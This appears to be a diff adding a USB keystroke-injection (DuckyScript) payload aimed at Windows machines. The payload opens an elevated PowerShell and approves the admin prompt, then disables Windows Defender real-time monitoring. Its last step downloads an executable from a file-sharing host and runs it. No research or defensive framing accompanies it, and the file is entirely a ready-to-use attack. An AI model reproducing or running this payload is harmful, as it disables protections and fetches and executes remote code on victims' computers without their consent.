@@ -1,0 +1,18 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell Start-Process PowerShell -Verb RunAs
+ENTER
+DELAY 5000
+RIGHT
+ENTER
+DELAY 2000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 2000
+ALT F4
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell -command Invoke-WebRequest https://cdn-149.anonfiles.com/j1K8O5f4z4/4b93b9fb-1679397377/main.exe -OutFile $env:USERPROFILE\\Desktop\\main.exe; Start-Process $env:USERPROFILE\\Desktop\\main.exe
+ENTER
